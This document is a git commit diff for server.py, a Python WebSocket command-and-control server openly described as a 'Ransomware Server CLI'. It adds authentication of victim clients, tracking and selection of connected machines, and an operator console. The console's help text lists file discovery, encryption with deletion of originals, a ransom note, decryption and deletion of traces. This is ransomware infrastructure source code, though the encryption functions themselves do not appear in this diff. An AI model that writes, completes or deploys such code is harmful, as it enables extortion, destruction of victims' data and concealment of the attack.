31a4bbbf217016428534696844e8a4c66f00957e
Elcris1 <eloicp10@gmail.com>
2025-12-13 18:07:42 +0100

    Add connections and basic commands to the server.py

--- server/server.py
+++ server/server.py
@@ -1,6 +1,7 @@
 import asyncio
 import websockets
 from Connection import Connection, ConnectionState
+import json
 
 class WebSocketCLIServer:
     def __init__(self, host="localhost", port=8765):
@@ -20,47 +21,156 @@ class WebSocketCLIServer:
             username = self.__check_first_message(first_message)
 
             if username is None:
-                await websocket.send("Invalid initial message. Connection closing.")
+                await websocket.send(self.__create_auth_reply(False))
                 await websocket.close()
                 return
             
+            # If username already exists, append a number to make it unique
+            if username in self.connected_clients:
+                username += str(len([x for x in self.connected_clients.keys() if x.startswith(username)])+1)
+            
+            # Create connection object
             connection = Connection(uri=websocket.remote_address, socket=websocket)
             connection.set_username(username)
             connection.change_state(ConnectionState.IDENTIFIED)
-
+            connection.set_system_info(json.loads(first_message).get("data", {}).get("system", "Unknown"))
             self.connected_clients[username] = connection
-            print(f"[Connected] {username} joined")
 
-            await websocket.send(f"Welcome, {username}!")
+            await websocket.send(self.__create_auth_reply(True))
+            print(f"[{username}] is connected to the server.")
 
-            async for message in websocket:
-                print(f"[{username}] {message}")
-                await self.broadcast(f"[{username}] {message}", sender=websocket)
+            # async for message in websocket:
+            #     print(f"[{username}] {message}")
+            #     await self.broadcast(f"[{username}] {message}", sender=websocket)
+            await connection.start()
 
         except websockets.exceptions.ConnectionClosed:
             pass
         finally:
-            if websocket in self.connected_clients.values():
-                print(f"[Disconnected] {self.connected_clients[websocket]} left")
-                del self.connected_clients[websocket]
+            if websocket in [conn.websocket for conn in self.connected_clients.values()]:
+                print(f"[{username}] has been disconnected left")
+                self.connected_clients[username].change_state(ConnectionState.DISCONNECTED)
+                #del self.connected_clients[websocket]
 
     def __check_first_message(self, message) -> str:
         """Check if the first message is a valid username."""
-        if message.startswith("USERNAME:"):
-            return message.split(":", 1)[1].strip()
+        if not self.__validate_message(message, "auth_req"):
+            return None
+        
+        data = json.loads(message).get("data", {})
+
+        if data.get("username", None) is not None:
+            return data["username"]
+        
         return None
+    
+    def __validate_message(self, message: str, expected_type: str) -> bool:
+        """Validate if the message is of the expected type."""
+        try:
+            msg_json = json.loads(message)
+            return msg_json.get("type") == expected_type
+        except json.JSONDecodeError:
+            return False
+
+    def __create_auth_reply(self, status: bool) -> str:
+        """Create an authentication reply message."""
+        reply = {
+            "type": "auth_rep",
+            "data": {
+                "status": "accepted" if status else "rejected",
+                "message": "Authentication successful." if status else "Authentication failed."
+            }
+        }
+        return json.dumps(reply)
+
     async def __cli(self):
         """Handle CLI input from the server terminal."""
         loop = asyncio.get_event_loop()
         while self.__should_cli_run:
-            msg = await loop.run_in_executor(None, input, "CLI> ")
-            if msg.lower() == "quit":
-                print("Shutting down server...")
-                await self.close_all_clients()
-                self.__server.close()
-                self.__should_cli_run = False
-            print(f"[Server CLI] {msg}")
+            cli_text = "CLI"
+            if self.__selected_client:
+                cli_text += f"({self.__selected_client.username})"
+
+            msg = await loop.run_in_executor(None, input, f"{cli_text}> ")
+            match msg.split():
+                case ["help"]:
+                    self.__show_help()
+                case ["info"]:
+                    print("Ransomware Server CLI")
+                case ["connections"]:
+                    self.__show_connections()
+                case ["select", username]: 
+                    if username in self.connected_clients.keys():
+                        self.__selected_client = self.connected_clients[username]
+                        print(f"Selected client: {username}")
+                    else:
+                        print(f"No client with username: {username}")
+                case ["connectioninfo"]:
+                    self.__show_connection_info()
+                case ["exit"] | ["quit"]:  
+                    print("Shutting down server...")
+                    await self.close_all_clients()
+                    self.__server.close()
+                    self.__should_cli_run = False
+                case _:
+                    print(f"Unknown command: {msg}")
+
+    
             #await self.broadcast(f"[Server CLI] {msg}")
+
+    def __show_help(self):
+        """Display available CLI commands."""
+        print("Available commands:")
+        print("\thelp - show this help message")
+        print("\tinfo - displays information about the ransomware")
+        print("\tconnections - shows all connected clients")
+        print("\tselect <username> - select a client to interact with")
+        print("\tconnectioninfo - shows information about the selected client")
+        print("\tenvcheck - checks the environment in which the program is running")
+        print("\tdirectory - discovers the files in the system avoiding specific file types and folders")
+        print("\t\tDefault is '/'")
+        print("\t\tExample: directory /Users/username/Documents")
+        print("\tsetup - sets up the cryptographic configuration")
+        print("\t\tOptions: ") 
+        print("\t\t\t--encrypt (enables encryption) ")
+        print("\t\t\t--delete (deletes files after encryption/decryption)")
+        print("\tencrypt - encrypts the discovered files")
+        print("\transomnote - displays the ransom note to the user")
+        print("\tdecrypt - decrypts the previously encrypted files")
+        print("\tdeletetraces - deletes traces of the program")
+        print("\ttestfunc - runs the function to be tested")
+        print("\texit or quit - quit the program")
+
+    def __show_connections(self):
+        """Display all connected clients."""
+        if not self.connected_clients:
+            print("No clients connected.")
+            return
+        
+        print("Connected clients:")
+        for username, conn in self.connected_clients.items():
+            print(f"- {username} (State: {conn.state.name})")
+
+    def __check_selected_client(self) -> bool:
+        """Check if a client is selected."""
+        if self.__selected_client is None:
+            print("No client selected. Use 'select <username>' to select a client.")
+            return False
+        return True
+    
+    def check_selected_client(func):
+        """Decorator to ensure a client is selected before running the method."""
+        def wrapper(self, *args, **kwargs):
+            if getattr(self, "_WebSocketCLIServer__selected_client", None) is None:
+                print("No client selected. Use 'select <username>' to select a client.")
+                return
+            return func(self, *args, **kwargs)
+        return wrapper
+    
+    @check_selected_client
+    def __show_connection_info(self):
+        """Display information about the selected client."""
+        self.__selected_client.show_info()
 
     async def broadcast(self, message, sender=None):
         """Send a message to all connected clients."""
@@ -73,10 +183,11 @@ class WebSocketCLIServer:
 
     async def close_all_clients(self):
         """Close all client connections."""
-        for websocket in list(self.connected_clients.values()):
-            await websocket.close()
+        for connection in list(self.connected_clients.values()):
+            await connection.websocket.close()
 
     async def __start_server(self):
+        """Executes the websocket server at the specificed host and port."""
         self.__server = await websockets.serve(
             self.handler,
             host = self.host,
